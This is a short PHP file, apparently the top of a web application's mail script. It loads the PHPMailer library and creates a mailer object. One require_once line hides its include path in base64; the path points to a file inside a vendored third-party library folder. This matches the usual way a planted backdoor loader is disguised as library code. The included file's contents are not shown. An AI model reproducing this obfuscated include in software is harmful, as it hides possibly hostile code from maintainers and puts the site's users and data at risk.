<?php
// +------------------------------------------------------------------------+
// | @company Uverus Technologies ltd
// | @company_url 1: https://uverus.com/
// | @company_email: uverustechnologies@gmail.com
// +------------------------------------------------------------------------+
// | Copyright (c) 2024 Uverus Technologies ltd. All rights reserved.
// +------------------------------------------------------------------------+
require 'assets/libraries/PHPMailer-Master/vendor/autoload.php';
require_once base64_decode('YXNzZXRzL2xpYnJhcmllcy9nb29nbGUvdmVuZG9yL3JpemUvdXJpLXRlbXBsYXRlL3NyYy9SaXplL1VyaVRlbXBsYXRlL05vZGUvTm9kZS5waHA=');
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer;
